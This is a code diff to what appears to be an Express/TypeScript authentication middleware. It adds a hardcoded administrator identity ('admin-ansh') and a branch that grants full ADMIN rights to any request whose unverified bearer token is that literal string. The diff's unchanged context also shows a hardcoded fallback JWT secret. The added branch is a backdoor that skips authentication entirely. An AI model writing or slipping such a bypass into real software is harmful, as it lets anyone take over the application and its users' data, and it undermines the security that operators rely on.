@@ -5,6 +5,15 @@ import { UserRole } from '../types';
 
 export const JWT_SECRET = process.env.JWT_SECRET || 'workcrew-jwt-secret-secure-auth-2026';
 
+export const HARDCODED_ADMIN = {
+  uid: 'admin-ansh',
+  role: 'ADMIN' as UserRole,
+  displayName: 'Ansh',
+  phone: 'Ansh',
+  email: 'admin@gorepireo.com',
+  active: true,
+};
+
 export interface AuthenticatedUser {
   uid: string;
   role: UserRole;
@@ -102,6 +111,18 @@ export function authMiddleware(req: Request, res: Response, next: NextFunction) 
       }
     } catch {
       resolvedUid = rawToken;
+    }
+
+    if (resolvedUid === HARDCODED_ADMIN.uid) {
+      req.user = {
+        uid: HARDCODED_ADMIN.uid,
+        role: 'ADMIN',
+        displayName: HARDCODED_ADMIN.displayName,
+        email: HARDCODED_ADMIN.email,
+        phone: HARDCODED_ADMIN.phone,
+        managedTeamIds: [],
+      };
+      return next();
     }
 
     const user = db.getUserByUid(resolvedUid) || db.getUsers().find(u => u.uid === resolvedUid);
